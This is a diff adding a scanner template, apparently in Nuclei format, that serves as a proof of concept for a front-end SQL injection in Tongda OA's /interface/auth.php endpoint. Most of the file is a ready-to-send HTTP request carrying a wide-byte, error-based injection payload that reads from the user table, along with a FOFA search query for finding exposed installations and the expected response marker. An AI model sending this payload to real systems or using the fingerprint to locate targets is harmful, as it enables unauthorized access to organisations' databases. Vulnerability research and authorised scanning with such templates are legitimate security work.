@@ -1,0 +1,34 @@
+id: poc-yzneg54cdlpbwliq
+info:
+  name: 通达OA interface前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yzneg54cdlpbwliq'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yzneg54cdlpbwliq
+    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
+http:
+- raw:
+  - 'GET /interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    3b712de481375
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
